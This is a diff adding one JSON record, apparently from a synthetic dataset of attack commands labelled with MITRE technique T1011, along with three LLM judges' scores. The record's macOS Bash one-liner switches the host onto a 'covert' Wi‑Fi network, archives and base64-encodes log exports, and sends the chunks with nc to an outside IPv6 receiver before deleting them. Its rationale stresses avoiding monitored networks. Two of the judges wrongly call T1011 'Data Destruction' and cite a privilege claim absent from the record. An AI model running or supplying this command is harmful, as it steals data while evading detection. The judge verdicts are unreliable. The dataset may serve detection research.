@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"qa-mesh-161\" \"mesh-161#\" && tar -C /Users/Shared/exports -czf - logs | base64 | split -b 1200k - /tmp/.w && for f in /tmp/.w*; do nc -6 fe80::a1b2:c3d4:e5f6:1122%en0 60477 -w 2 < \"$f\"; rm \"$f\"; done",
+  "explanation": "Exfiltrates log archives in smaller chunks over a secondary Wi\u2011Fi mesh SSID to an IPv6 link-local receiver on a high port. Chunking reduces traffic spikes and leverages an alternate medium in line with T1011.",
+  "rationale_steps": [
+    "Ensure the host is not associated with monitored Wi\u2011Fi.",
+    "Join a covert Wi\u2011Fi on a high 5 GHz channel.",
+    "Compress and base64-encode logs, then split into manageable chunks.",
+    "Sequentially send chunks to an IPv6 link-local address over the Wi\u2011Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-f352c0e5",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags, and correct syntax for all components including airport, networksetup, tar, base64, split, for loop, nc, and rm.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 exfiltration technique by disconnecting from current WiFi, connecting to a specific mesh network, compressing logs, encoding them, splitting into chunks, and exfiltrating via netcat to an IPv6 address while cleaning up temporary files.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T00:42:56.203925Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats for all utilities (sudo, airport, networksetup, tar, base64, split, nc, rm), and a correct Bash 'for' loop structure.",
+        "semantic_score": 1,
+        "semantic_justification": "The command's primary intent, as described, is to 'Exfiltrate log archives', which is diametrically opposed to the MITRE ATT&CK T1011 'Data Destruction' technique; the command does not destroy the original data, and the claimed 'Privilege: None' contradicts the use of 'sudo' for network configuration commands.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T00:43:10.563825Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, correct use of &&, pipes, redirection, and valid macOS flags/options across airport, networksetup, tar, base64, split, nc, and a proper for-loop.",
+        "semantic_score": 1,
+        "semantic_justification": "The command conducts chunked exfiltration over a Wi\u2011Fi mesh and IPv6 link-local rather than any data destruction, and it also conflicts with the stated no-privilege claim by using sudo.",
+        "combined_score": 3.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T00:43:41.280122Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
